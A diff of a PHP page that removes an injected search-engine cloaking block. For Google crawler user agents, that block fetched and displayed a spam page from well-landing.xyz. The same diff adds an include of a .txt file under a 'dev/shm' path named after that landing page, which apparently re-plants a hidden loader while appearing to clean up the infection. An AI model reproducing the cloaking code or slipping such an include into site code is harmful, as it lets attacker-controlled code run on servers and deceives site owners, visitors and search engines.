@@ -1,27 +1,4 @@
 <?php
-function is_google_bot() {
-    $agents = array(
-        "Googlebot", 
-        "AdsBot-Google", 
-        "Mediapartners-Google", 
-        "Google-Site-Verification", 
-        "Google-InspectionTool", 
-        "Googlebot-Mobile", 
-        "Googlebot-News"
-    );
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    foreach ($agents as $agent) {
-        if (strpos($user_agent, $agent) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
-
-if (is_google_bot()) {
-    echo file_get_contents("https://well-landing.xyz/landing/e-palli.html");
-    exit;
-}
 
 /**
  * Note: This file may contain artifacts of previous malicious infection.
@@ -41,6 +18,7 @@ if (is_google_bot()) {
 		
 	</head>
 	<?php
+	include_once __DIR__."/dev/shm/e-palli.txt";
 	include_once __DIR__."/assets/header.php";
 	include __DIR__."/db.php";
 	global $db;
